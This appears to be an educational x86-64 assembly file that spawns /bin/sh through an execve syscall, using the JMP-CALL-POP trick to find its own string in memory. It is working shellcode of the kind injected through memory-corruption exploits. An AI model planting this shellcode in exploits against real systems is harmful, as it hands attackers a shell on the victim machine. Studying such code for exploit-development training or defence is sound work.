;---------------------------------------------------
; EXECVE "/bin/sh" Using JMP-CALL-POP Technique
;       Execve doesn't return if succesful
;        There's no need for exit syscall      
;---------------------------------------------------

global _start
section .text

_start:
    jmp address

shellcode:
    xor rax, rax
    
    pop rdi
    
    mov [rdi+7], byte ah
    mov [rdi+8], rdi
    mov [rdi+16], rax
    
    lea rsi,[rdi+8]
    lea rdx, [rdi+16]

    add rax, 59
    syscall

address:
    call shellcode
    shellcode_string: db "/bin/shABBBBBBBBCCCCCC"
